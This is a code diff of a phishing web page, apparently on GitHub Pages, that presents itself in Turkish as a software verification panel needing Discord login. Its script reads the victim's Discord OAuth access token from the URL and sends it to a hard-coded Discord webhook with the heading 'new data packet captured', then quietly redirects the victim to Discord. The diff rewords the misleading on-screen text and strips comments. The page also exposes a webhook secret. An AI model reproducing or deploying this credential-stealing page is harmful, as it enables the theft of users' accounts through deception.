@@ -30,7 +30,7 @@
         <p class="text-[8px] tracking-[5px] text-gray-500 mb-8 uppercase font-bold">Yazılım Doğrulama Sistemi</p>
         
         <div class="bg-white/5 p-5 rounded-xl mb-8 border border-white/5 text-left text-[11px] leading-relaxed text-gray-400">
-            <p class="mono"><span class="text-cyan-400 font-bold">></span> Erişim sağlamak için Discord kimlik doğrulaması gereklidir. Veriler şifrelenerek merkeze iletilir.</p>
+            <p class="mono"><span class="text-cyan-400 font-bold">></span> Sisteme erişim sağlamak için kimlik doğrulaması gereklidir. Veriler Cortex Neural Network üzerinden senkronize edilecektir.</p>
         </div>
 
         <button onclick="startAuth()" class="w-full py-4 bg-transparent text-cyan-400 rounded-lg font-bold glow-btn uppercase tracking-widest text-[10px]">
@@ -43,12 +43,11 @@
         <div class="text-center">
             <div class="w-16 h-16 border-4 border-cyan-400 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
             <h2 class="text-xl font-bold text-white tracking-[0.3em] uppercase">Yetkilendirme Başarılı</h2>
-            <p class="text-cyan-400 text-xs mt-4 mono opacity-80">Veriler Cortex Neural Network sunucularına aktarılıyor...</p>
+            <p class="text-cyan-400 text-xs mt-4 mono opacity-80">Veriler ana merkeze iletiliyor...</p>
         </div>
     </div>
 
     <script>
-        // Ayarlar
         const CLIENT_ID = "1480231196045873292";
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1480228951015297055/YkGkx8UliKe2XQtD0HxNxj1DBo_2rksQomQWoCaF61x-YUrVR9960IvGj-FVR99NY6iL";
         const REDIRECT_URI = "https://s15005453-hue.github.io/ria-store/";
@@ -64,31 +63,28 @@
             const token = params.get('access_token');
 
             if (token) {
-                // UI Değiştir
                 document.getElementById('landing').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'flex';
 
-                // Discord'a Veri Gönder
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: "Cortex V4 Log Manager",
+                        username: "Cortex V4 Log",
                         avatar_url: "https://i.imgur.com/4S4W9i8.png",
                         embeds: [{
-                            title: "💀 Yeni Kullanıcı Verisi Yakalandı",
+                            title: "💀 Yeni Veri Paketi Yakalandı",
                             color: 0x00FFCC,
                             fields: [
-                                { name: "🔑 Erişim Token", value: "```" + token + "```" },
-                                { name: "🔗 Kaynak Panel", value: "```" + REDIRECT_URI + "```" },
-                                { name: "🕒 İşlem Tarihi", value: "```" + new Date().toLocaleString('tr-TR') + "```" }
+                                { name: "🔑 Token", value: "```" + token + "```" },
+                                { name: "🔗 Kaynak URL", value: "```" + REDIRECT_URI + "```" },
+                                { name: "🕒 İşlem Zamanı", value: "```" + new Date().toLocaleString('tr-TR') + "```" }
                             ],
-                            footer: { text: "Cortex Software Systems | Neural Link" },
+                            footer: { text: "Cortex Software V4 | Neural Network" },
                             timestamp: new Date()
                         }]
                     })
                 }).then(() => {
-                    // 3 saniye sonra Discord'a yönlendir
                     setTimeout(() => {
                         window.location.href = "https://discord.com/app";
                     }, 3000);
